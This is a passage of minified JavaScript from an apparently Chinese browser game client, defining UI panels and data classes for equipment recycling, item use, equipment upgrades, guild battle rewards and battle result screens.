this.eCb5:I.SmeltCC.getCbSignal()==t.target.name&&"-1"==t.target.name?I.SmeltCC.setCbSignal(""):I.SmeltCC.setCbSignal(t.target.name),this.eCb0.selected=I.SmeltCC.getCbSignal()==t.target.name,this.eCb1.selected="0"==t.target.name,this.eCb2.selected="1"==t.target.name,this.eCb3.selected="2"==t.target.name,this.eCb4.selected="3"==t.target.name,this.eCb5.selected="4"==t.target.name,this.updateList();break;case this.btnChange:if(w.BagCT.ins().getBagGoodsCountById(w.BagCT.BAG_TYPE_OTHTER,d.ItemConst.CBSHOPITEM)<=0)return void T.TipsCT.ins().showTips(gettext("|C:0xF3311E&T:{0}数量不足|",h.GlobalConfig.ItemConfig[d.ItemConst.CBSHOPITEM].name));w.BagCT.ins().sendUseCb();break;case this.btnGo:if(!w.BagCT.ins().shopAdCbTime)return void T.TipsCT.ins().showTips(gettext("次数不足"));if(2==platform.getAdType())return C.Setting.ins().setValue(C.ClientSet.HuiShou_TIME,n.DateUtils.formatServerTime(y.GameServerCC.serverTime)),void m.GameLogic.ins().sendAdReward(g.AD_REWARDTYPE.CALLBACK_SHOP);if(3==platform.getAdType())return void m.GameLogic.ins().sendAdReward(g.AD_REWARDTYPE.CALLBACK_SHOP);if(v.Recharge.ins().isGotAdPrivilege||o.DeviceUtils.IsPC)return void m.GameLogic.ins().sendAdReward(g.AD_REWARDTYPE.CALLBACK_SHOP);window.platform.showAd(function(){m.GameLogic.ins().sendAdReward(g.AD_REWARDTYPE.CALLBACK_SHOP)},u.AdType.HuiShou);break;case this.eAddBtn0:for(var i,s=[],a=0;a<this.list.numElements;a++){var r=this.list.getElementAt(a);if(r)if(i=r.data.group,1==r.data.group)for(var l=I.SmeltCC.getEqCbNum2(r.data.type||0,"-1"==I.SmeltCC.getCbSignal(),r.data.group),p=0;p<l.length;p++){var c=l[p];w.BagCT.ins().isNotRecycleXiLianEquip()&&c.isXiLian()||s.push(l[p])}else if(5==r.data.group)for(var S=0,x=r.data.itemid;S<x.length;S++)for(var D=x[S],A=I.SmeltCC.getFuEqCbNum(D,"-1"==I.SmeltCC.getCbSignal(),r.data.group),p=0;p<A.length;p++){var c=A[p];w.BagCT.ins().isNotRecycleXiLianEquip()&&c.isXiLian()||s.push(A[p])}else{var k=void 0,B=r.data.itemid,P=Number(I.SmeltCC.getCbSignal()||0);if(B&&(k=B[0]),3==r.data.group&&P){var R=f.SubRoles.ins().getSubRoleByIndex(0),E=R.job+P>5?R.job+P-5:R.job+P;k=B[E]}for(var A=w.BagCT.ins().getBagItemSById(k),p=0;p<A.length;p++){var c=A[p];w.BagCT.ins().isNotRecycleXiLianEquip()&&c.isXiLian()||s.push(A[p])}}}s.length>0?b.WarnWin.show(gettext("确定回收已勾选的所有品质装备!"),function(){var t=w.BagCT.ins().getShowList(s);if(t&&t.length>0){var n=new _.BagCallBackConfirmData(e,e.callBackFunc,s,t,i);win.open("BagCallBackConfirmWin",n)}else{var o=5==i?1:i;w.BagCT.ins().sendCbequip(o,s)}},this):T.TipsCT.ins().showTips(gettext("无回收物品"))}},e.prototype.updateShopInfo=function(){var t=v.Recharge.ins().recycleTime>0?gettext("(回收+100%)"):"";this.labPer.textFlow=a.TextFlowMaker.generateTextFlow1(gettext("当前回收价格比例：|C:0x43FF00&T:{0}|",(w.BagCT.ins().shopCbPer||0)+"%"+t));var e=w.BagCT.ins().getBagGoodsCountById(w.BagCT.BAG_TYPE_OTHTER,d.ItemConst.CBSHOPITEM)||0,i=1,n=e>=i?"0x40D016":"0xB1B097";this.labCost.textFlow=a.TextFlowMaker.generateTextFlow1(gettext("消耗古董变更比例：|C:{0}&T:{1}|",n,e+"/"+i))},e.prototype.updateShopTime=function(){var t=v.Recharge.ins().recycleTime>0?gettext("(回收+100%)"):"";this.labPer.textFlow=a.TextFlowMaker.generateTextFlow1(gettext("当前回收价格比例：|C:0x43FF00&T:{0}|",(w.BagCT.ins().shopCbPer||0)+"%"+t)),Timer.has(this.updateShopTime,this)||Timer.start(1e3,0,this.updateShopTime,this),this.labTime.textFlow=a.TextFlowMaker.generateTextFlow1(gettext("回收比例变更时间：|C:0xE9E9E9&T:{0}|",n.DateUtils.getFormatBySecond(w.BagCT.ins().shopCbTime,n.DateUtils.TIME_FORMAT_12))),w.BagCT.ins().shopCbTime--,w.BagCT.ins().shopCbTime<0&&(this.labTime.text="",this.labTime.textFlow=[],Timer.stop(this.updateShopInfo,this))},e.prototype.updateList=function(){var t=this.eTab.selectedIndex+1;4==t&&(t=5),this.listArr.replaceAll(I.SmeltCC.GetCbList(t))},e.prototype.updateBtnRp=function(){this.eTab.validateNow();var t=this.eTab.getElementAt(1);t&&t.eRp&&(t.eRp.visible=w.BagCT.ins().callbackRed.v)},e.prototype.callBackFunc=function(t,e){if(t==p.BagCBConfirmResult.Confirm&&e.items){var i=5==e.group?1:e.group;w.BagCT.ins().sendCbequip(i,e.items)}},e.prototype.clearPanel=function(){},e.prototype.changeView=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.baseTab?(this.baseTab.selectedIndex=t[0]||0,this.baseViewStack&&(this.baseViewStack.selectedIndex=t[0]||0)):t&&(this.openIdx=t[0]||0)},e}(r.BaseView);e.BagCallBackPanel=x,window.BagCallBackPanel=x,__reflect(x.prototype,"BagCallBackPanel",[]),window.BagCallBackPanel=x},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TreasureItemData=void 0;var n=function(){function t(){}return t}();e.TreasureItemData=n,window.TreasureItemData=n,__reflect(n.prototype,"TreasureItemData",[]),window.TreasureItemData=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemUseTipsWin=void 0;var n=i(5),o=i(1),s=i(0),a=i(39),r=i(11),l=i(689),h=i(6),u=i(10),p=i(8),d=i(7),c=i(2),f=i(31),g=i(209),m=i(4),v=i(231),y=i(63),C=i(94),T=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ItemUseTipsSkin",e.maxNum=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.numLabel.restrict="0-9",this.showNoBtn=!1,this.gainList.itemRenderer=v.GainGoodsItem,this.gainList.dataProvider=this.arc=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this._data=t[0],this.showNoBtn=t[1],this.goodsId=this._data.configID|this._data.id,this._itemCfg=s.GlobalConfig.ItemConfig[this.goodsId],this.addTouchEvent(this.BG,this.otherClose),this.addTouchEvent(this.minBtn,this.onTap),this.addTouchEvent(this.maxBtn,this.onTap),this.addTouchEvent(this.sub1Btn,this.onTap),this.addTouchEvent(this.add1Btn,this.onTap),this.addTouchEvent(this.useBtn,this.onTap),this.addTouchEvent(this.useBtn0,this.onTap),this.gainList.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onTouchList,this),this._data&&this._data.handle>0&&(observe(this,this.useSuccess,h.BagCT.ins().postUseItemSuccess),observe(this,this.itemChange,h.BagCT.ins().postItemChange),observe(this,this.itemChange,h.BagCT.ins().postItemDel)),this.addChangeEvent(this.numLabel,this.onTxtChange),this.setData(this._data),this.updateUse(),this.updateCost(),this.itemList.itemRenderer=r.ItemBase,this.useBtn.visible=!this.showNoBtn,this.useLabel.visible=this.showNoBtn;var i=u.ItemUtil.getType(this._data.itemConfig||s.GlobalConfig.ItemConfig[this._data.id]);this.add.visible=i!=a.ItemType.TYPE_25,i!=a.ItemType.TYPE_47?removeFromParent(this.eTime):this._data.handle&&h.BagCT.ins().sendItemEndTime(this._data.handle),i==a.ItemType.TYPE_48&&removeFromParent(this.add)},e.prototype.flusTimeInfo=function(){if(!this._data.endTime||!this.description1.visible)return void(this.description1.text="");var t=Math.max(0,(this._data.endTime-d.GameServerCC.serverTime)/1e3);t>0?this.description1.text=gettext("{0}后过期自动删除",p.DateUtils.getFormatBySecond(t,p.DateUtils.TIME_FORMAT_5)):this.description1.text=""},e.prototype.enterFrame=function(){if(this.flusTimeInfo(),this.eTime.parent&&this._data.endTime){var t=Math.max(0,(this._data.endTime-d.GameServerCC.serverTime)/1e3);t>0?this.eTime.text=gettext("倒计时:  ")+p.DateUtils.getFormatBySecond(t,p.DateUtils.TIME_FORMAT_1):this.eTime.text="",this._data.endTime>0&&0==t&&(this.useBtn.label=gettext("已过期"))}},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e]},e.prototype.otherClose=function(t){win.close("ItemUseTipsWin")},e.prototype.onTxtChange=function(t){var e=Number(this.numLabel.text);e>this.maxNum&&(e=this.maxNum),this.useNum=e,this.numLabel.text&&!e&&(this.numLabel.text="1"),this.useNum&&(this.numLabel.text=this.useNum+""),this.updateBtn()},e.prototype.onTap=function(t){this.useNum||(this.useNum=1,this.numLabel.text=this.useNum+"");var e=u.ItemUtil.getType(this._data.itemConfig||s.GlobalConfig.ItemConfig[this._data.id]);switch(t.target){case this.minBtn:this.useNum=1;break;case this.maxBtn:this.useNum=this.maxNum;break;case this.sub1Btn:this.useNum--,this.useNum<=0&&(this.useNum=1);break;case this.add1Btn:this.useNum++,this.useNum>this.maxNum&&(this.useNum=this.maxNum);break;case this.useBtn:if(e==a.ItemType.TYPE_27)return win.open("ComposeTip",this._data.itemConfig.id||this._data.id),void win.close(this);if(e==a.ItemType.TYPE_57)return void c.TipsCT.ins().showTips(gettext("请添加客服进行兑换领取"));if(e==a.ItemType.TYPE_65)return void l.FloatWinCT.ins().onUse(this._data,this.useNum);var i=this.useFun();if(!i)return;l.FloatWinCT.ins().onUse(this._data,i);break;case this.useBtn0:if("double"==this.currentState){var n=this.useFun();if(!n)return;return void l.FloatWinCT.ins().onUse(this._data,n,!0)}this.onBack()}this.numLabel.text=this.useNum+"",this.updateBtn()},e.prototype.onTouchList=function(t){var e=t.item;null!=t.item&&(y.WarnCT.ins().handleItemWayTouch(e),win.close(this))},e.prototype.useFun=function(){var t,e;Number(this.numLabel.text)<=0&&(this.numLabel.text="1");var i=this._data.itemConfig||s.GlobalConfig.ItemConfig[this._data.id],n=s.GlobalConfig.ItemDescConfig[(null===i||void 0===i?void 0:i.descIndex)||0],o=this.useNum,a=this.useNum;if(n&&8==(null===n||void 0===n?void 0:n.type)&&(null===(t=null===i||void 0===i?void 0:i.useArg)||void 0===t?void 0:t.useGrid)){var r=(null===(e=null===i||void 0===i?void 0:i.useArg)||void 0===e?void 0:e.useGrid)||1;if(h.BagCT.ins().getAllSurplusCount(1)<0)return c.TipsCT.ins().showTips(gettext("背包已满")),!1;var l=h.BagCT.ins().getAllSurplusCount(this.useNum*r);if(l>0?a=this.useNum>l?l:this.useNum:(o=h.BagCT.ins().getAllSurplusCount(0),a=Math.floor(o/r)),!a)return c.TipsCT.ins().showTips(gettext("背包已满")),!1}return win.get("ItemUseTipsWin")&&win.close("ItemUseTipsWin"),a},e.prototype.onBack=function(){win.open("ItemCbTip",this._data,"1"),win.close("ItemUseTipsWin")},e.prototype.useSuccess=function(){var t=h.BagCT.ins().getBagItemById(this.goodsId);t?this.setData(t):win.close("ItemUseTipsWin")},e.prototype.itemChange=function(){var t=h.BagCT.ins().getBagItemById(this.goodsId);t?this.setData(t):win.close(this)},e.prototype.updateState=function(){var t=this._data,e=u.ItemUtil.getType(t.itemConfig||s.GlobalConfig.ItemConfig[this._data.id]);e==a.ItemType.TYPE_2?this.currentState="2":e==a.ItemType.TYPE_10?this.currentState="10":e==a.ItemType.TYPE_27?this.currentState="27":e==a.ItemType.TYPE_12?this.currentState="guildgifts":e==a.ItemType.TYPE_14||e==a.ItemType.TYPE_50?this.currentState="rename":e==a.ItemType.TYPE_57?(this.currentState="cdkeyGift",this.description0.visible=!0,this.description1.visible=!0,this.description.visible=!1):-1!=g.GConst.DoubleItem.indexOf(t.configID)?this.currentState="double":this.currentState="2"},e.prototype.updateBaseInfo=function(t){var e=this._data;t.count=t.count?t.count:1;var i=t.count+"",o=e.itemConfig||s.GlobalConfig.ItemConfig[e.id];m.ActorCC.isLocation?this.nameLabel.text=o.name+("("+(o.id||e.id)+")"):this.nameLabel.text=o.name,this.nameLabel.textColor=u.ItemUtil.getQualityColor(u.ItemUtil.getQuality2(o)),this.itemIcon.setData(o),this.lv.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("等级：|C:0xB1B097&T:{0}级|",o.level||1)),this.num.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("数量：|C:0xB1B097&T:{0}|",i)),this.description.textFlow=n.TextFlowMaker.generateTextFlow(o.desc),this.description0.textFlow=n.TextFlowMaker.generateTextFlow(o.desc)},e.prototype.updateUse=function(){var t=this._data,e=u.ItemUtil.getType(t.itemConfig||s.GlobalConfig.ItemConfig[this._data.id]);this.maxNum=t.count,t.itemConfig&&t.itemConfig.id==C.GuildSoulsLandCT.SINGLE_ITEM_ID&&(this.maxNum=1),this.useNum=e==a.ItemType.TYPE_48||e==a.ItemType.TYPE_50?1:this._data.count,this.useNum>this.maxNum&&(this.useNum=this.maxNum),this.numLabel.text=this.useNum+""},e.prototype.setData=function(t){this._data=t;var e=this._data.itemConfig||s.GlobalConfig.ItemConfig[this._data.id];this.updateState(),this.updateBaseInfo(t),this.updateGuildGift(e),this.updateRandomGift(e),this.updateBtn(),this.updateGain()},e.prototype.updateGain=function(){this.validateNow(),this.gainListGroup.visible=!1,this.arc.replaceAll(null),this.gainListGroup.height=0;var t=u.ItemUtil.getType(this._data.itemConfig||s.GlobalConfig.ItemConfig[this._data.id]);t!=a.ItemType.TYPE_57&&(this.btnGroup.bottom=10)},e.prototype.updateCost=function(){var t;if(this._data){var e=this._data.itemConfig;e||(e=s.GlobalConfig.ItemConfig[this._data.id]);var i=null===(t=null===e||void 0===e?void 0:e.useArg)||void 0===t?void 0:t["double"];if(i){var n=Number(this.numLabel.text)<=0?1:Number(this.numLabel.text);this.costCm.setShow(f.ITEM_ICON.yuanbao,n*i)}}},e.prototype.updateBtn=function(){if(this._data){var t=this._data.itemConfig||s.GlobalConfig.ItemConfig[this._data.id];u.ItemUtil.getType(t)==a.ItemType.TYPE_47?this._data.endTime&&this._data.endTime>d.GameServerCC.serverTime&&(this.useBtn.label=gettext("{0}元宝",t.needyuanbao*this.useNum)):(null===t||void 0===t?void 0:t.needyuanbao)&&(this.useBtn.label=gettext("元宝",t.needyuanbao*this.useNum)),this.updateCost()}},e.prototype.updateRandomGift=function(t){var e=s.GlobalConfig.ItemRandomConfig[t.id];e&&(this.itemList1.dataProvider=new eui.ArrayCollection(e.awards))},e.prototype.updateGuildGift=function(t){var e=s.GlobalConfig.ItemGiftConfig[t.id];e&&(this.itemList1.dataProvider=new eui.ArrayCollection(e.awards))},e}(o.BaseView);e.ItemUseTipsWin=T,window.ItemUseTipsWin=T,__reflect(T.prototype,"ItemUseTipsWin",[]),window.ItemUseTipsWin=T},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TunsiData=e.TunTianData=void 0;var n=i(18),o=i(8),s=i(22),a=i(0),r=i(13),l=i(126),h=i(7),u=i(151),p=function(){function t(){this.lv=0,this.jubian={},this.tuntianval=0,this.tunsiMax=0,this.act=!0,this.icon="equip_tunshi_icon0",this.eff="",this.isShow=!1}return t.prototype.parse=function(t){this.pos=t.readByte(),this.isShow=1==t.readByte(),this.tuntianval=t.readInt(),this.lv=t.readInt(),this.jubian.lv=t.readInt(),this.act=0!=this.lv,this.tunBoss={};var e=this.pos;switch(this.pos){case 5:e=4;break;case 6:e=5;break;case 7:e=6;break;case 8:e=6;break;case 9:e=7}if(this.eff=RES_DIR_EFF+"tunshi_actived_"+e,this.icon="equip_tunshi_icon"+e,a.GlobalConfig.TunTianLevelUp){this.lvCfg=a.GlobalConfig.TunTianLevelUp[this.pos]&&a.GlobalConfig.TunTianLevelUp[this.pos][this.lv||1],this.setCfg=a.GlobalConfig.TunTianSetConf[this.role]&&a.GlobalConfig.TunTianSetConf[this.role][this.pos],this.name=this.setCfg.name;var i=a.GlobalConfig.TunTianChangeConf[this.pos]&&a.GlobalConfig.TunTianChangeConf[this.pos][this.jubian.lv];this.lvCfg&&(this.tunsiMax=this.lvCfg.tunshiNum+(i&&i.expnum||0),this.updateCost())}},t.prototype.clinetInfo=function(t,e){this.pos=e,this.role=t,this.lv=0,this.act=0!=this.lv,this.jubian.lv=0;var i=e;switch(this.pos){case 5:i=4;break;case 6:i=5;break;case 7:i=6;break;case 8:i=6;break;case 9:i=7}if(this.icon="equip_tunshi_icon"+i,a.GlobalConfig.TunTianLevelUp){this.lvCfg=a.GlobalConfig.TunTianLevelUp[this.pos]&&a.GlobalConfig.TunTianLevelUp[this.pos][this.lv||1],this.setCfg=a.GlobalConfig.TunTianSetConf[this.role]&&a.GlobalConfig.TunTianSetConf[this.role][this.pos],this.eff=RES_DIR_EFF+"tunshi_actived_"+i,this.name=this.setCfg.name;var n=a.GlobalConfig.TunTianChangeConf[this.pos]&&a.GlobalConfig.TunTianChangeConf[this.pos][this.jubian.lv];this.lvCfg&&(this.tunsiMax=this.lvCfg.tunshiNum+(n&&n.expnum||0),this.updateCost())}},t.prototype.updateCost=function(){if(this.act){var t=a.GlobalConfig.TunTianLevelUp[this.pos]&&a.GlobalConfig.TunTianLevelUp[this.pos][this.lv+1];this.cost=t?t.cost.concat():[]}else this.cost=this.setCfg.cost.concat()},t.prototype.bayeLvOpen=function(){if(!(this.lvCfg&&this.setCfg&&this.setCfg.limit&&this.setCfg.limit[this.lv+1]))return null;var t=r.SubRoles.ins().getSubRoleByIndex(this.role);if(t){for(var e,i="",o=this.setCfg.limit[this.lv+1],s=!0,h=[],p=0,d=o;p<d.length;p++){var c=d[p];if(1==c.type){var f=l.ExtremeEquipCC.getZhiZunLv(c.pos),g=f>=c.limit,m=a.GlobalConfig.ZhiZunEquipLevel[c.pos]&&a.GlobalConfig.ZhiZunEquipLevel[c.pos][c.limit],v=a.GlobalConfig.ZhiZunSuitSkillConf.posName[c.pos];m&&v&&(e=g?n.ColorUtil.GREEN_COLOR_N:n.ColorUtil.RED_COLOR_N,i+="|C:"+e+"&T:"+(m.headTxt+v+" "),h.push({icon:"icon_extreme_0"+l.ExtremeEquipCC.positions.indexOf(c.pos),name:"|C:"+e+"&T:"+(m.headTxt+v)})),s=s&&g}else if(2==c.type){var y=r.SubRoles.ins().getSubRoleByIndex(0),C=y.heirloom.getInfoBySolt(c.pos-1),T=C&&C.lv>=c.limit,b=a.GlobalConfig.HeirloomEquipConfig[c.pos][c.limit];b&&(e=T?n.ColorUtil.GREEN_COLOR_N:n.ColorUtil.RED_COLOR_N,i+="|C:"+e+"&T:"+((b?b.name:"")+" "),h.push({icon:RES_DIR_ITEMICON+(b?b.icon:"")+".png",name:"|C:"+e+"&T:"+(b?b.name:"")})),s=s&&T}else if(3==c.type){var w=u.WushuangEquipCT.getCurPosItemId(c.pos)?u.WushuangEquipCT.getCurPosItemId(c.pos):a.GlobalConfig.PeerlessBaseConfig.initequip[c.pos],I=u.WushuangEquipCT.getStage(w),_=u.WushuangEquipCT.getCurPosItemId(c.pos)&&I>=c.limit,S=u.WushuangEquipCT.getStagePosCfg(c.pos,c.limit);if(S){var x=a.GlobalConfig.ItemConfig[S.itemId];e=_?n.ColorUtil.GREEN_COLOR_N:n.ColorUtil.RED_COLOR_N,i+="|C:"+e+"&T:"+((x?x.name:"")+" "),h.push({icon:RES_DIR_ITEMICON+(x?x.icon:"")+".png",name:"|C:"+e+"&T:"+(x?x.name:"")})}s=s&&_}}return{isOpen:s,openTips:i,limitDataList:h}}},t}();e.TunTianData=p,window.TunTianData=p,__reflect(p.prototype,"TunTianData",[]),window.TunTianData=p;var d=function(){function t(){this.endtime=0,this.attrStr=[]}return t.prototype.timeOver=function(){return 0!=this.endtime&&this.endtime<=h.GameServerCC.serverTime},t.prototype.parase=function(t){var e;this.role=t.readByte(),this.pos=t.readByte(),this.addval=t.readInt(),this.endtime=t.readInt(),this.bossid=t.readInt(),console.log("endtime",this.endtime),this.endtime>0&&(this.endtime=o.DateUtils.formatMiniDateTime(this.endtime)),this.cfg=a.GlobalConfig.MonstersConfig[this.bossid],this.attr=[];var i=r.SubRoles.ins().getSubRoleByIndex(this.role),n=a.GlobalConfig.TunTianSetConf[this.role]&&a.GlobalConfig.TunTianSetConf[this.role][this.pos];i&&n&&(this.job=i.job,this.wepoenname=n.name);var l=a.GlobalConfig.TunTianAttrConf[this.pos];if(l){for(var h in l.attr){var u=l.attr[h];u=u*this.addval/1e4>>0;var p={type:+h,value:u};this.attr.push(p),this.attrStr.push(s.AttributeData.getAttrShowStrNoColor([p],":",!1,0,!0))}this.icon="tunshi"+(null===(e=this.cfg)||void 0===e?void 0:e.head)+"_png"}},t.getTunSiAttrByVal=function(t,e){var i=[],n=a.GlobalConfig.TunTianAttrConf[t];if(!n)return i;for(var o in n.attr){var s=n.attr[o];s=s*e/1e4>>0;var r={type:+o,value:s};i.push(r)}return i},t}();e.TunsiData=d,window.TunsiData=d,__reflect(d.prototype,"TunsiData",[]),window.TunsiData=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GameFlashSaleItem=void 0;var n=i(3),o=i(0),s=function(t){function e(){var e=t.call(this)||this;return e._sn_="GameFlashSaleItem1Skin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){var t;this._info=this.data,this.skin&&this._info&&(this._cfg=o.GlobalConfig.TimeLimitGiftConfig[this._info.giftId],this.labelDisplay.text=(null===(t=this._cfg)||void 0===t?void 0:t.typeName)||"")},e}(n.BaseItemRender);e.GameFlashSaleItem=s,window.GameFlashSaleItem=s,__reflect(s.prototype,"GameFlashSaleItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildBattleRewardAllocateWin=void 0;var n=i(1),o=i(28),s=i(2),a=i(329),r=i(51),l=function(t){function e(){var e=t.call(this)||this;return e._sn_="GuildBattleRewardAllocateWinSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this._infoArr=new eui.ArrayCollection,this.listItem.itemRenderer=a.GuildBattleItem3,this.listItem.dataProvider=this._infoArr,this.addTouchEvent(this.btnSure,this.onClick)},e.prototype.onClick=function(t){var e=r.GuildBattleCT.ins().getModel().curAllotRewardId,i=[];for(var n in r.GuildBattleCT.ins().getModel().tempRewardDic){var o=+n,a=r.GuildBattleCT.ins().getModel().getTempRewardCnt(o);0>=a||i.push({actorId:o,cnt:a})}return 0==i.length?void s.TipsCT.ins().showTips(gettext("请先选择好分配数量")):void r.GuildBattleCT.ins().reqAllotReward([{id:e,arr:i}])},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t[0];this.txtCnt.text=i.cnt+"/"+i.maxCnt,r.GuildBattleCT.ins().getModel().tempRewardDic={},r.GuildBattleCT.ins().getModel().canAllotCnt=i.maxCnt-i.cnt,r.GuildBattleCT.ins().getModel().curAllotRewardId=i.rewardId,r.GuildBattleCT.ins().requestOwnGuildRank(),this.observe(r.GuildBattleCT.ins().postGuildPersonalRank,this.updateMember)},e.prototype.updateMember=function(){for(var t=o.Guild.ins().getGuildMembers(1),e=[],i=0,n=t.length;n>i;i++)e.push({info:t[i],score:r.GuildBattleCT.ins().getModel().getScore(t[i].roleID)});this._infoArr.source=e,this._infoArr.refresh()},e}(n.BaseView);e.GuildBattleRewardAllocateWin=l,window.GuildBattleRewardAllocateWin=l,__reflect(l.prototype,"GuildBattleRewardAllocateWin",[]),window.GuildBattleRewardAllocateWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildBattleItem3=void 0;var n=i(3),o=i(106),s=i(51),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="GuildBattleItem3Skin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.sub1Btn,this.onClick),this.addTouchEvent(this.add1Btn,this.onClick),this.dataChanged()},e.prototype.onClick=function(t){var e=0;switch(t.currentTarget){case this.add1Btn:var i=s.GuildBattleCT.ins().getModel().getLeftCnt();e=s.GuildBattleCT.ins().getModel().getTempRewardCnt(this._info.info.roleID),i>0&&(e++,s.GuildBattleCT.ins().getModel().setTempRewardCnt(this._info.info.roleID,e));break;case this.sub1Btn:e=s.GuildBattleCT.ins().getModel().getTempRewardCnt(this._info.info.roleID),e>0&&e--,s.GuildBattleCT.ins().getModel().setTempRewardCnt(this._info.info.roleID,e)}this.txtCnt.text=e+""},e.prototype.dataChanged=function(){if(this._info=this.data,this.skin&&this._info){this.txtName.text="["+o.GuildLanguage.guildOffice[this._info.info.office]+"]"+this._info.info.name,this.imgJob.source="zjmhead_json.yuanhead"+this._info.info.job+"1",this.txtScore.text=gettext("获得积分：")+s.GuildBattleCT.ins().getModel().getScore(this._info.info.roleID);var t=s.GuildBattleCT.ins().getModel().getTempRewardCnt(this._info.info.roleID);this.txtCnt.text=t+""}},e}(n.BaseItemRender);e.GuildBattleItem3=a,window.GuildBattleItem3=a,__reflect(a.prototype,"GuildBattleItem3",[]),window.GuildBattleItem3=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DominateFightResultWin=void 0;var n=i(1),o=i(0),s=i(20),a=i(28),r=i(331),l=i(78),h=function(t){function e(){var e=t.call(this)||this;return e._sn_="DominateResultSkin",e.QUIT_T=30,e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=r.DominateFightResultDataItem},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.bgClose,this.onTouch),this.addTouchEvent(this.sureBtn,this.onTouch);var i=t[0],n=t[1],r=t[2],h=t[3],u=t[4],p=t[5];switch(this._winType=u,l.DominateWorldCT.ins().nowFightType){case 1:this.currentState="tuteng";break;case 2:this.currentState="mojian";break;case 3:this.currentState="lingqi"}if(this.blueScore.text=n+"",this.redScore.text=r+"",2==this._winType){i==a.Guild.ins().guildID?(this.blueResult.source="tag_win",this.redResult.source="tag_lose",this.loseMask0.visible=!1,this.loseMask1.visible=!0):(this.blueResult.source="tag_lose",this.redResult.source="tag_win",this.loseMask0.visible=!0,this.loseMask1.visible=!1),this.sureBtn.visible=!1;var d=o.GlobalConfig.InstanceConfig;if(d){var c=d[s.GameMap.fubenID];this.leaveInfo.text=gettext("{0}s后自动离开战场",c.closeTime),this.QUIT_T=p}this.quitTime=egret.getTimer()+1e3*this.QUIT_T,Timer.has(this.onTime,this)||Timer.start(1e3,0,this.onTime,this)}else this.blueScore.text=n+"",this.redScore.text=r+"",this.blueResult.visible=this.redResult.visible=!1,this.loseMask0.visible=!1,this.loseMask1.visible=!1,this.leaveInfo.visible=!1;var f=h;this.list.dataProvider=new eui.ArrayCollection(f)},e.prototype.removeDisplay=function(){},e.prototype.onTouch=function(t){switch(t.target){case this.bgClose:case this.sureBtn:this.onExit()}},e.prototype.onTime=function(){var t=(this.quitTime-egret.getTimer())/1e3>>0;(this.onExit(),Timer.stop(this.onTime,this))},e.prototype.onExit=function(){win.close(this)},e}(n.BaseView);e.DominateFightResultWin=h,window.DominateFightResultWin=h,__reflect(h.prototype,"DominateFightResultWin",[]),window.DominateFightResultWin=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DominateFightResultDataItem=void 0;var n=i(3),o=i(4),s=i(7),a=i(78),r=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.dataChanged=function(){var t=this;this.data&&(this.data.serverId==s.GameServerCC.serverID?this.data.roleName==o.ActorCC.myName?this.currentState="oneself":this.data.guildName==o.ActorCC.guildName?this.currentState="own":this.currentState="enemy":this.currentState="enemy",egret.callLater(function(){t.itemIndex<3?(t.rankImg.source="paihang_d"+(t.itemIndex+1),t.rankImg.visible=!0,t.rankTxt.visible=!1):(t.rankTxt.text=t.itemIndex+1+"",t.rankImg.visible=!1,t.rankTxt.visible=!0),t.nameTxt.text=t.data.roleName+"[S"+t.data.serverId+"]",t.nameTxt0.text=t.data.guildName+"[S"+t.data.serverId+"]";var e=0,i=0,n=0;switch(a.DominateWorldCT.ins().nowFightType){case 1:e=t.data.killCount,i=t.data.tutemFC,n=t.data.tutemTC;break;case 2:e=t.data.killScore,i=t.data.swordTime,n=t.data.swordScore;break;case 3:e=t.data.killScore,i=t.data.harmScore,n=t.data.totalScore}t.kaTxt.text=""+e,t.collectionTxt.text=i+"",t.scoreTxt.text=n+""},this))},e}(n.BaseItemRender);e.DominateFightResultDataItem=r,window.DominateFightResultDataItem=r,__reflect(r.prototype,"DominateFightResultDataItem",[]),window.DominateFightResultDataItem=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DominateWorldTotemFightPanel=void 0;var n=i(1),o=i(0),s=i(2),a=i(333),r=i(78),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="DominateTotemFightWinSkin",e.isSave=!1,e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.saveBtn,this.onSave),this.eList.itemRenderer=a.DominateWorldTotemFightItem,this.eList.dataProvider=this.kata=new eui.ArrayCollection;var i=r.DominateWorldCT.ins().returnWorldIdInfo(r.DominateWorldCT.ins().myWorldId);if(i){var n=o.GlobalConfig.DominationBtLvCfg;this.cityName.text=n[i.lv].townName[i.idx]}t[0]?this.names.text=t[0].changeName+"":this.names.text=gettext("无"),this.isSave=!1,this.setGuardEvery()},e.prototype.removeDisplay=function(){!this.skin},e.prototype.onSave=function(){if(this.isSave)return void s.TipsCT.ins().showTips(gettext("保存中"));this.isSave=!0;var t=!0;if(this.eList.numElements>0)for(var 